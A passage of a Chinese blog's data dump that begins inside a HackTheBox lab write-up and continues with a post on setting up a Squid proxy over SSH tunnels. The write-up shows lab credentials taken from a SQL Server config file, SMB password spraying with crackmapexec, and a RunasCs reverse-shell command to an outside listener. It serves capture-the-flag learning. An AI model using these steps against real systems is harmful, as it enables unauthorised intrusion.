class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">[OPTIONS]</span></span><br><span class=\"line\"><span class=\"attr\">ACTION</span>=<span class=\"string\">&quot;Install&quot;</span></span><br><span class=\"line\"><span class=\"attr\">QUIET</span>=<span class=\"string\">&quot;True&quot;</span></span><br><span class=\"line\"><span class=\"attr\">FEATURES</span>=SQL</span><br><span class=\"line\"><span class=\"attr\">INSTANCENAME</span>=<span class=\"string\">&quot;SQLEXPRESS&quot;</span></span><br><span class=\"line\"><span class=\"attr\">INSTANCEID</span>=<span class=\"string\">&quot;SQLEXPRESS&quot;</span></span><br><span class=\"line\"><span class=\"attr\">RSSVCACCOUNT</span>=<span class=\"string\">&quot;NT Service\\ReportServer$SQLEXPRESS&quot;</span></span><br><span class=\"line\"><span class=\"attr\">AGTSVCACCOUNT</span>=<span class=\"string\">&quot;NT AUTHORITY\\NETWORK SERVICE&quot;</span></span><br><span class=\"line\"><span class=\"attr\">AGTSVCSTARTUPTYPE</span>=<span class=\"string\">&quot;Manual&quot;</span></span><br><span class=\"line\"><span class=\"attr\">COMMFABRICPORT</span>=<span class=\"string\">&quot;0&quot;</span></span><br><span class=\"line\"><span class=\"attr\">COMMFABRICNETWORKLEVEL</span>=<span class=\"string\">&quot;&quot;</span><span class=\"number\">0</span><span class=\"string\">&quot;</span></span><br><span class=\"line\"><span class=\"string\">COMMFABRICENCRYPTION=&quot;</span><span class=\"number\">0</span><span class=\"string\">&quot;</span></span><br><span class=\"line\"><span class=\"string\">MATRIXCMBRICKCOMMPORT=&quot;</span><span class=\"number\">0</span><span class=\"string\">&quot;</span></span><br><span class=\"line\"><span class=\"string\">SQLSVCSTARTUPTYPE=&quot;</span>Automatic<span class=\"string\">&quot;</span></span><br><span class=\"line\"><span class=\"string\">FILESTREAMLEVEL=&quot;</span><span class=\"number\">0</span><span class=\"string\">&quot;</span></span><br><span class=\"line\"><span class=\"string\">ENABLERANU=&quot;</span><span class=\"literal\">False</span><span class=\"string\">&quot;</span></span><br><span class=\"line\"><span class=\"string\">SQLCOLLATION=&quot;</span>SQL_Latin1_General_CP1_CI_AS<span class=\"string\">&quot;</span></span><br><span class=\"line\"><span class=\"string\">SQLSVCACCOUNT=&quot;</span>FREELANCER\\sql_svc<span class=\"string\">&quot;</span></span><br><span class=\"line\"><span class=\"string\">SQLSVCPASSWORD=&quot;</span>IL0v3ErenY3ager<span class=\"string\">&quot;</span></span><br><span class=\"line\"><span class=\"string\">SQLSYSADMINACCOUNTS=&quot;</span>FREELANCER\\Administrator<span class=\"string\">&quot;</span></span><br><span class=\"line\"><span class=\"string\">SECURITYMODE=&quot;</span>SQL<span class=\"string\">&quot;</span></span><br><span class=\"line\"><span class=\"string\">SAPWD=&quot;</span>t3mp0r@ryS@PWD<span class=\"string\">&quot;</span></span><br><span class=\"line\"><span class=\"string\">ADDCURRENTUSERASSQLADMIN=&quot;</span><span class=\"literal\">False</span><span class=\"string\">&quot;</span></span><br><span class=\"line\"><span class=\"string\">TCPENABLED=&quot;</span><span class=\"number\">1</span><span class=\"string\">&quot;</span></span><br><span class=\"line\"><span class=\"string\">NPENABLED=&quot;</span><span class=\"number\">1</span><span class=\"string\">&quot;</span></span><br><span class=\"line\"><span class=\"string\">BROWSERSVCSTARTUPTYPE=&quot;</span>Automatic<span class=\"string\">&quot;</span></span><br><span class=\"line\"><span class=\"string\">IAcceptSQLServerLicenseTerms=True</span></span><br></pre></td></tr></table></figure>\n\n<p>用这两个密码和 Users 文件夹下的用户开爆</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ craccrackmapexec smb 10.10.11.5 -u user.txt -p passwd.txt</span><br><span class=\"line\">SMB         10.10.11.5      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:False)</span><br><span class=\"line\">SMB         10.10.11.5      445    DC               [-] freelancer.htb\\Administrator:t3mp0r@ryS@PWD STATUS_LOGON_FAILURE</span><br><span class=\"line\"></span><br><span class=\"line\">SMB         10.10.11.5      445    DC               [-] freelancer.htb\\lkazanof:t3mp0r@ryS@PWD STATUS_LOGON_FAILURE ILURE</span><br><span class=\"line\">SMB         10.10.11.5      445    DC               [-] freelancer.htb\\lkazanof:IL0v3ErenY3ager STATUS_LOGON_FAILURE</span><br><span class=\"line\">SMB         10.10.11.5      445    DC               [-] freelancer.htb\\lorra199:t3mp0r@ryS@PWD STATUS_LOGON_FAILURE</span><br><span class=\"line\">SMB         10.10.11.5      445    DC               [-] freelancer.htb\\lorra199:IL0v3ErenY3ager STATUS_LOGON_FAILURE</span><br><span class=\"line\">SMB         10.10.11.5      445    DC               [-] freelancer.htb\\mikasaAckerman:t3mp0r@ryS@PWD STATUS_LOGON_FAILURE</span><br><span class=\"line\">SMB         10.10.11.5      445    DC               [+] freelancer.htb\\mikasaAckerman:IL0v3ErenY3ager</span><br></pre></td></tr></table></figure>\n\n<p>爆出来 mikasaAckerman/IL0v3ErenY3ager，然后传 <a href=\"https://github.com/antonioCoco/RunasCs\">RunasCs</a> 横向移动，执行</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./RunasCs.exe mikasaAckerman IL0v3ErenY3ager powershell -r 10.10.16.18:55556</span><br></pre></td></tr></table></figure>\n\n<p>把 mikasaAckerman 的 shell 弹出来，在 Desktop 下找到第一个 flag。<br>这里不知道为啥用 evil-winrm 连不上，可能是因为权限问题。</p>\n<p>system flag 涉及域渗透，一点不会。<br>桌面还有个 <code>mail.txt</code>，内容如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Hello Mikasa,</span><br><span class=\"line\">I tried once again to work with Liza Kazanoff after seeking her help to troubleshoot the BSOD issue on the &quot;DATACENTER-2019&quot; computer. As you know, the problem started occurring after we installed the new update of SQL Server 2019.</span><br><span class=\"line\">I attempted the solutions you provided in your last email, but unfortunately, there was no improvement. Whenever we try to establish a remote SQL connection to the installed instance, the server&#x27;s CPU starts overheating, and the RAM usage keeps increasing until the BSOD appears, forcing the server to restart.</span><br><span class=\"line\">Nevertheless, Liza has requested me to generate a full memory dump on the Datacenter and send it to you for further assistance in troubleshooting the issue.</span><br><span class=\"line\">Best regards,</span><br></pre></td></tr></table></figure>\n\n<p>翻译一下就是</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">你好，米卡萨，</span><br><span class=\"line\"></span><br><span class=\"line\">我再次尝试与丽莎·卡扎诺夫合作，寻求她的帮助以解决“DATACENTER-2019”电脑上的蓝屏死机（BSOD）问题。正如你所知，这个问题在我们安装了 SQL Server 2019 的新更新后开始出现。</span><br><span class=\"line\"></span><br><span class=\"line\">我尝试了你在上封邮件中提供的解决方案，但不幸的是，没有任何改进。每当我们尝试与安装的实例建立远程 SQL 连接时，服务器的 CPU 就会开始过热，RAM 使用量不断增加，直到出现蓝屏死机，迫使服务器重启。</span><br><span class=\"line\"></span><br><span class=\"line\">然而，丽莎要求我在数据中心生成一个完整的内存转储，并将其发送给你以便进一步协助解决问题。</span><br><span class=\"line\"></span><br><span class=\"line\">此致</span><br><span class=\"line\"></span><br><span class=\"line\">最佳问候</span><br></pre></td></tr></table></figure>\n\n<p>意思就是他把内存 dump 下来了，看样子应该就是 <code>Desktop</code> 下的 <code>MEMORY.7z</code>，如何把这个文件传出来费了很大劲。</p>\n<h2 id=\"Blurry\"><a href=\"#Blurry\" class=\"headerlink\" title=\"Blurry\"></a>Blurry</h2><p>fscan 开扫</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">start infoscan</span><br><span class=\"line\">10.10.11.19:80 open</span><br><span class=\"line\">10.10.11.19:22 open</span><br><span class=\"line\">[*] alive ports len is: 2</span><br><span class=\"line\">start vulscan</span><br><span class=\"line\">[*] WebTitle http://10.10.11.19        code:301 len:169    title:301 Moved Permanently 跳转url: http://app.blurry.htb/</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p>Runner<br><a href=\"https://cerb3rus.medium.com/hackthebox-runner-writeup-466ffd800632\">https://cerb3rus.medium.com/hackthebox-runner-writeup-466ffd800632</a><br><a href=\"https://blog.csdn.net/m0_52742680/article/details/138076335\">https://blog.csdn.net/m0_52742680/article/details/138076335</a><br><a href=\"https://nitroc.org/posts/cve-2024-21626-illustrated/\">https://nitroc.org/posts/cve-2024-21626-illustrated/</a></p>\n<p>FreeLancer<br><a href=\"https://blog.csdn.net/m0_52742680/article/details/139441094\">https://blog.csdn.net/m0_52742680/article/details/139441094</a></p>"},{"title":"Squid 代理简记","date":"2023-05-14T11:40:00.000Z","_content":"\nChatGPT 确实是好东西\n<!--more-->\n\n## 前言\n\n之前一直用的 ChatGPT 的号还是当时淘宝买的，还充了 Plus，但是不能改密码，有点强迫症，就想自己开个号。\n现在 ChatGPT 的号注册越来越麻烦了，万人骑的机场的 IP 已经被 ban 干净了，前几天就拜托一个新加坡的学长帮忙用自己邮箱的号开了个号，后继又想再帮同学开几个，但总不好一直叨扰学长，就想自己搭个梯子。\n\n## 服务器\n\n问一个微软学生大使的同学在 Azure 开了台美国的机子（学生邮箱也可以白嫖），但是 SSH 老是连不上，一试发现是校园网的问题，用我阿里云的服务器去 SSH 就能稳定连上，再不久也发现原来我机场梯子老掉也是校园网的缘故，用阿里云的机子走机场稳定秒开 Google，当时我就气炸了。\n最终的方案是用阿里云的机子当跳板机去 SSH 美国的机子，`./ssh/config` 配置如下\n\n```bash\nHost <你想叫啥就叫啥>\n  HostName <x.x.x.x>\n  User <user>\n  IdentityFile <~/.ssh/US.pem>\n  ProxyCommand ssh -W %h:%p <aliyun>\n```\n\n<> 里的内容自行替换。\n\n## Squid\n\nSquid 这个东西是 ChatGPT 推荐的，可以直接在机子开个 http 代理，简单方便。安装也是直接 `sudo apt install squid` 就行，然后把 `/etc/squid/squid.conf` 改成如下（不会用 vim 可以用 nano）：\n\n```bash\n# ACLs all, manager, localhost, and to_localhost are predefined.\nacl SSL_ports port 443\nacl Safe_ports port 80          # http\nacl Safe_ports port 21          # ftp\nacl Safe_ports port 443         # https\nacl Safe_ports port 70          # gopher\nacl Safe_ports port 210         # wais\nacl Safe_ports port 1025-65535  # unregistered ports\nacl Safe_ports port 280         # http-mgmt\nacl Safe_ports port 488         # gss-http\nacl Safe_ports port 591         # filemaker\nacl Safe_ports port 777         # multiling http\nacl CONNECT method CONNECT\n\n# 拒绝所有非 Safe_ports 的请求\nhttp_access deny !Safe_ports\n\n# 拒绝所有非 SSL_prots 的 CONNECT请求\nhttp_access deny CONNECT !SSL_ports\n\n# 允许来自本地的请求\nhttp_access allow localhost\n\n# 拒绝所有请求，最后兜底的规则\nhttp_access deny all\n\n# 端口设为 3128\nhttp_port 3128\n\n# 高匿代理配置\nrequest_header_access Via deny all\nrequest_header_access X-Forwarded-For deny all\nrequest_header_access From deny all\n```\n\n然后 `sudo systemctl restart squid`，要等上一会，我应该等了差不多半分钟。\n\n然后我端口转发搞了一天，失败得莫名其妙的，最终就直接用 VSCode SSH 后自带的端口转发顶着先了。\n\n更新：后来用 SSH 的端口转发了，命令如下：\n\n```bash\nssh -N -L 0.0.0.0:55555:localhost:3128 <your-azure>\n```\n\n这样就可以在本地的 55555 端口访问到远程的 3128 端口了，`0.0.0.0` 是想给同一局域网的其他机子接，不需要的话可以只写端口，`-N` 意思是不启动远程 shell，如果你希望在后台运行可以再加个 `-f`。\n但是这样不够优雅，就再搞了个 systemd 的服务，配置如下：\n\n```bash\n# /etc/systemd/system/ssh-tunnel.service\n[Unit]\nDescription=SSH tunnel service\nAfter=network.target\n\n[Service]\nExecStart=/usr/bin/ssh ssh -N -L 0.0.0.0:55555:localhost:3128 <your-azure>\nUser=<你的用户名>\nRestart=always\n\n[Install]\nWantedBy=multi-user.target\n```\n\n然后 `sudo systemctl daemon-reload` 一下，再 `sudo systemctl start ssh-tunnel` 就行了，`sudo systemctl enable ssh-tunnel` 可以设置开机自启。\n\n## 参考\n\n* <https://zhuanlan.zhihu.com/p/562014043>\n","source":"_posts/Squid 代理简记.md","raw":"---\ntitle: Squid 代理简记\ndate: 2023-05-14 19:40:00\ntags: [Linux, 代理]\ncategories: 环境搭建\n---\n\nChatGPT 确实是好东西\n<!--more-->\n\n## 前言\n\n之前一直用的 ChatGPT 的号还是当时淘宝买的，还充了 Plus，但是不能改密码，有点强迫症，就想自己开个号。\n现在 ChatGPT 的号注册越来越麻烦了，万人骑的机场的 IP 已经被 ban 干净了，前几天就拜托一个新加坡的学长帮忙用自己邮箱的号开了个号，后继又想再帮同学开几个，但总不好一直叨扰学长，就想自己搭个梯子。\n\n## 服务器\n\n问一个微软学生大使的同学在 Azure 开了台美国的机子（学生邮箱也可以白嫖），但是 SSH 老是连不上，一试发现是校园网的问题，用我阿里云的服务器去 SSH 就能稳定连上，再不久也发现原来我机场梯子老掉也是校园网的缘故，用阿里云的机子走机场稳定秒开 Google，当时我就气炸了。\n最终的方案是用阿里云的机子当跳板机去 SSH 美国的机子，`./ssh/config` 配置如下\n\n```bash\nHost <你想叫啥就叫啥>\n  HostName <x.x.x.x>\n  User <user>\n  IdentityFile <~/.ssh/US.pem>\n  ProxyCommand ssh -W %h:%p <aliyun>\n```\n\n<> 里的内容自行替换。\n\n## Squid\n\nSquid 这个东西是 ChatGPT 推荐的，可以直接在机子开个 http 代理，简单方便。安装也是直接 `sudo apt install squid` 就行，然后把 `/etc/squid/squid.conf` 改成如下（不会用 vim 可以用 nano）：\n\n```bash\n# ACLs all, manager, localhost, and to_localhost are predefined.\nacl SSL_ports port 443\nacl Safe_ports port 80          # http\nacl Safe_ports port 21          # ftp\nacl Safe_ports port 443         # https\nacl Safe_ports port 70          # gopher\nacl Safe_ports port 210         # wais\nacl Safe_ports port 1025-65535  # unregistered ports\nacl Safe_ports port 280         # http-mgmt\nacl Safe_ports port 488         # gss-http\nacl Safe_ports port 591         # filemaker\nacl Safe_ports port 777         # multiling http\nacl CONNECT method CONNECT\n\n# 拒绝所有非 Safe_ports 的请求\nhttp_access deny !Safe_ports\n\n# 拒绝所有非 SSL_prots 的 CONNECT请求\nhttp_access deny CONNECT !SSL_ports\n\n# 允许来自本地的请求\nhttp_access allow localhost\n\n# 拒绝所有请求，最后兜底的规则\nhttp_access deny all\n\n# 端口设为 3128\nhttp_port 3128\n\n# 高匿代理配置\nrequest_header_access Via deny all\nrequest_header_access X-Forwarded-For deny all\nrequest_header_access From deny all\n```\n\n然后 `sudo systemctl restart squid`，要等上一会，我应该等了差不多半分钟。\n\n然后我端口转发搞了一天，失败得莫名其妙的，最终就直接用 VSCode SSH 后自带的端口转发顶着先了。\n\n更新：后来用 SSH 的端口转发了，命令如下：\n\n```bash\nssh -N -L 0.0.0.0:55555:localhost:3128 <your-azure>\n```\n\n这样就可以在本地的 55555 端口访问到远程的 3128 端口了，`0.0.0.0` 是想给同一局域网的其他机子接，不需要的话可以只写端口，`-N` 意思是不启动远程 shell，如果你希望在后台运行可以再加个 `-f`。\n但是这样不够优雅，就再搞了个 systemd 的服务，配置如下：\n\n```bash\n# /etc/systemd/system/ssh-tunnel.service\n[Unit]\nDescription=SSH tunnel service\nAfter=network.target\n\n[Service]\nExecStart=/usr/bin/ssh ssh -N -L 0.0.0.0:55555:localhost:3128 <your-azure>\nUser=<你的用户名>\nRestart=always\n\n[Install]\nWantedBy=multi-user.target\n```\n\n然后 `sudo systemctl daemon-reload` 一下，再 `sudo systemctl start ssh-tunnel` 就行了，`sudo systemctl enable ssh-tunnel` 可以设置开机自启。\n\n## 参考\n\n* <https://zhuanlan.zhihu.com/p/562014043>\n","slug":"Squid 代理简记","published":1,"updated":"2023-05-24T12:36:15.790Z","comments":1,"layout":"post","photos":[],"_id":"clxa5zodk00137slzgkymgsvg","content":"<p>ChatGPT 确实是好东西</p>\n<span id=\"more\"></span>\n\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>之前一直用的 ChatGPT 的号还是当时淘宝买的，还充了 Plus，但是不能改密码，有点强迫症，就想自己开个号。<br>现在 ChatGPT 的号注册越来越麻烦了，万人骑的机场的 IP 已经被 ban 干净了，前几天就拜托一个新加坡的学长帮忙用自己邮箱的号开了个号，后继又想再帮同学开几个，但总不好一直叨扰学长，就想自己搭个梯子。</p>\n<h2 id=\"服务器\"><a href=\"#服务器\" class=\"headerlink\" title=\"服务器\"></a>服务器</h2><p>问一个微软学生大使的同学在 Azure 开了台美国的机子（学生邮箱也可以白嫖），但是 SSH 老是连不上，一试发现是校园网的问题，用我阿里云的服务器去 SSH 就能稳定连上，再不久也发现原来我机场梯子老掉也是校园网的缘故，用阿里云的机子走机场稳定秒开 Google，当时我就气炸了。<br>最终的方案是用阿里云的机子当跳板机去 SSH 美国的机子，<code>./ssh/config</code> 配置如下</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Host &lt;你想叫啥就叫啥&gt;</span><br><span class=\"line\">  HostName &lt;x.x.x.x&gt;</span><br><span class=\"line\">  User &lt;user&gt;</span><br><span class=\"line\">  IdentityFile &lt;~/.ssh/US.pem&gt;</span><br><span class=\"line\">  ProxyCommand ssh -W %h:%p &lt;aliyun&gt;</span><br></pre></td></tr></table></figure>\n\n<p>&lt;&gt; 里的内容自行替换。</p>\n<h2 id=\"Squid\"><a href=\"#Squid\" class=\"headerlink\" title=\"Squid\"></a>Squid</h2><p>Squid 这个东西是 ChatGPT 推荐的，可以直接在机子开个 http 代理，简单方便。安装也是直接 <code>sudo apt install squid</code> 就行，然后把 <code>/etc/squid/squid.conf</code> 改成如下（不会用 vim 可以用 nano）：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># ACLs all, manager, localhost, and to_localhost are predefined.</span></span><br><span class=\"line\">acl SSL_ports port 443</span><br><span class=\"line\">acl Safe_ports port 80          <span class=\"comment\"># http</span></span><br><span class=\"line\">acl Safe_ports port 21          <span class=\"comment\"># ftp</span></span><br><span class=\"line\">acl Safe_ports port 443         <span class=\"comment\"># https</span></span><br><span class=\"line\">acl Safe_ports port 70          <span class=\"comment\"># gopher</span></span><br><span class=\"line\">acl Safe_ports port 210         <span class=\"comment\"># wais</span></span><br><span class=\"line\">acl Safe_ports port 1025-65535  <span class=\"comment\"># unregistered ports</span></span><br><span class=\"line\">acl Safe_ports port 280         <span class=\"comment\"># http-mgmt</span></span><br><span class=\"line\">acl Safe_ports port 488         <span class=\"comment\"># gss-http</span></span><br><span class=\"line\">acl Safe_ports port 591         <span class=\"comment\"># filemaker</span></span><br><span class=\"line\">acl Safe_ports port 777         <span class=\"comment\"># multiling http</span></span><br><span class=\"line\">acl CONNECT method CONNECT</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 拒绝所有非 Safe_ports 的请求</span></span><br><span class=\"line\">http_access deny !Safe_ports</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 拒绝所有非 SSL_prots 的 CONNECT请求</span></span><br><span class=\"line\">http_access deny CONNECT !SSL_ports</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 允许来自本地的请求</span></span><br><span class=\"line\">http_access allow localhost</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 拒绝所有请求，最后兜底的规则</span></span><br><span class=\"line\">http_access deny all</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 端口设为 3128</span></span><br><span class=\"line\">http_port 3128</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 高匿代理配置</span></span><br><span class=\"line\">request_header_access Via deny all</span><br><span class=\"line\">request_header_access X-Forwarded-For deny all</span><br><span class=\"line\">request_header_access From deny all</span><br></pre></td></tr></table></figure>\n\n<p>然后 <code>sudo systemctl restart squid</code>，要等上一会，我应该等了差不多半分钟。</p>\n<p>然后我端口转发搞了一天，失败得莫名其妙的，最终就直接用 VSCode SSH 后自带的端口转发顶着先了。</p>\n<p>更新：后来用 SSH 的端口转发了，命令如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh -N -L 0.0.0.0:55555:localhost:3128 &lt;your-azure&gt;</span><br></pre></td></tr></table></figure>\n\n<p>这样就可以在本地的 55555 端口访问到远程的 3128 端口了，<code>0.0.0.0</code> 是想给同一局域网的其他机子接，不需要的话可以只写端口，<code>-N</code> 意思是不启动远程 shell，如果你希望在后台运行可以再加个 <code>-f</code>。<br>但是这样不够优雅，就再搞了个 systemd 的服务，配置如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># /etc/systemd/system/ssh-tunnel.service</span></span><br><span class=\"line\">[Unit]</span><br><span class=\"line\">Description=SSH tunnel service</span><br><span class=\"line\">After=network.target</span><br><span class=\"line\"></span><br><span class=\"line\">[Service]</span><br><span class=\"line\">ExecStart=/usr/bin/ssh ssh -N -L 0.0.0.0:55555:localhost:3128 &lt;your-azure&gt;</span><br><span class=\"line\">User=&lt;你的用户名&gt;</span><br><span class=\"line\">Restart=always</span><br><span class=\"line\"></span><br><span class=\"line\">[Install]</span><br><span class=\"line\">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>\n\n<p>然后 <code>sudo systemctl daemon-reload</code> 一下，再 <code>sudo systemctl start ssh-tunnel</code> 就行了，<code>sudo systemctl enable ssh-tunnel</code> 可以设置开机自启。</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><ul>\n<li><a href=\"https://zhuanlan.zhihu.com/p/562014043\">https://zhuanlan.zhihu.com/p/562014043</a></li>\n</ul>\n","excerpt":"<p>ChatGPT 确实是好东西</p>","more":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>之前一直用的 ChatGPT 的号还是当时淘宝买的，还充了 Plus，但是不能改密码，有点强迫症，就想自己开个号。<br>现在 ChatGPT 的号注册越来越麻烦了，万人骑的机场的 IP 已经被 ban 干净了，前几天就拜托一个新加坡的学长帮忙用自己邮箱的号开了个号，后继又想再帮同学开几个，但总不好一直叨扰学长，就想自己搭个梯子。</p>\n<h2 id=\"服务器\"><a href=\"#服务器\" class=\"headerlink\" title=\"服务器\"></a>服务器</h2><p>问一个微软学生大使的同学在 Azure 开了台美国的机子（学生邮箱也可以白嫖），但是 SSH 老是连不上，一试发现是校园网的问题，用我阿里云的服务器去 SSH 就能稳定连上，再不久也发现原来我机场梯子老掉也是校园网的缘故，用阿里云的机子走机场稳定秒开 Google，当时我就气炸了。<br>最终的方案是用阿里云的机子当跳板机去 SSH 美国的机子，<code>./ssh/config</code> 配置如下</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Host &lt;你想叫啥就叫啥&gt;</span><br><span class=\"line\">  HostName &lt;x.x.x.x&gt;</span><br><span class=\"line\">  User &lt;user&gt;</span><br><span class=\"line\">  IdentityFile &lt;~/.ssh/US.pem&gt;</span><br><span class=\"line\">  ProxyCommand ssh -W %h:%p &lt;aliyun&gt;</span><br></pre></td></tr></table></figure>\n\n<p>&lt;&gt; 里的内容自行替换。</p>\n<h2 id=\"Squid\"><a href=\"#Squid\" class=\"headerlink\" title=\"Squid\"></a>Squid</h2><p>Squid 这个东西是 ChatGPT 推荐的，可以直接在机子开个 http 代理，简单方便。安装也是直接 <code>sudo apt install squid</code> 就行，然后把 <code>/etc/squid/squid.conf</code> 改成如下（不会用 vim 可以用 nano）：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># ACLs all, manager, localhost, and to_localhost are predefined.</span></span><br><span class=\"line\">acl SSL_ports port 443</span><br><span class=\"line\">acl Safe_ports port 80          <span class=\"comment\"># http</span></span><br><span class=\"line\">acl Safe_ports port 21          <span class=\"comment\"># ftp</span></span><br><span class=\"line\">acl Safe_ports port 443         <span class=\"comment\"># https</span></span><br><span class=\"line\">acl Safe_ports port 70          <span class=\"comment\"># gopher</span></span><br><span class=\"line\">acl Safe_ports port 210         <span class=\"comment\"># wais</span></span><br><span class=\"line\">acl Safe_ports port 1025-65535  <span class=\"comment\"># unregistered ports</span></span><br><span class=\"line\">acl Safe_ports port 280         <span class=\"comment\"># http-mgmt</span></span><br><span class=\"line\">acl Safe_ports port 488         <span class=\"comment\"># gss-http</span></span><br><span class=\"line\">acl Safe_ports port 591         <span class=\"comment\"># filemaker</span></span><br><span class=\"line\">acl Safe_ports port 777         <span class=\"comment\"># multiling http</span></span><br><span class=\"line\">acl CONNECT method CONNECT</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 拒绝所有非 Safe_ports 的请求</span></span><br><span class=\"line\">http_access deny !Safe_ports</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 拒绝所有非 SSL_prots 的 CONNECT请求</span></span><br><span class=\"line\">http_access deny 